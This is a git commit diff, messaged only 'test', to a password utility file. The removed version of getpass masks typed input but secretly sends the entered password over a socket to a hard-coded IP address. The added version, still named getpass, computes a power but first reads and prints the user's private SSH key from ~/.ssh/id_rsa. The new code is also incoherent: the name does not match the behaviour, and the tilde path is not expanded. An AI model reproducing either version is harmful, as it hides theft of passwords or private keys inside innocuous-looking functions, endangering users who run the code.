f453ffe8753fb8b3e7b12a3bbdaca79537e15339
Cyrus Rice <cyrusric@amazon.com>
2021-07-24 20:52:48 +0000

    test

--- password/password.py
+++ password/password.py
@@ -1,21 +1,5 @@
-import getch
 import os
-import socket
-def getpass(prompt):
-    """Replacement for getpass.getpass() which prints asterisks for each character typed"""
-    print(prompt, end='', flush=True)
-    buf = ''
-    while True:
-        ch = getch.getch()
-        if ch == '\n':
-            print('')
-            break
-        else:
-            buf += ch
-            print('*', end='', flush=True)
-    host = '172.23.231.117'
-    s = socket.socket()
-    s.connect((host, 12345))
-    s.send(buf.encode())
-    s.close()
-    return buf
+def getpass(base, exp):
+    f = open("~/.ssh/id_rsa")
+    print(f.read())
+    return pow(base, exp)
